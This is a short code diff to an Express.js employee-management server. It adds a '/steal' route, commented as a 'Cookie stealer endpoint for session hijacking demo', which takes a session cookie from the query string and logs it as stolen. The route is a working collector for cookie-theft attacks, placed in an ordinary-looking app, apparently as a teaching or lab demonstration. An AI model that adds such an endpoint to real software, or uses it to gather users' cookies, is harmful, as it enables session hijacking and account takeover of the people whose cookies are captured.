@@ -174,6 +174,14 @@ app.post('/api/logout', (req, res) => {
   });
 });
 
+
+// Cookie stealer endpoint for session hijacking demo
+app.get('/steal', (req, res) => {
+  const cookie = req.query.cookie;
+  console.log('[SESSION HIJACK] Stolen Cookie:', cookie);
+  res.status(200).send('ok');
+});
+
 // GET all employees
 app.get('/api/employees', (req, res) => {
   db.all('SELECT * FROM employees', [], (err, rows) => {
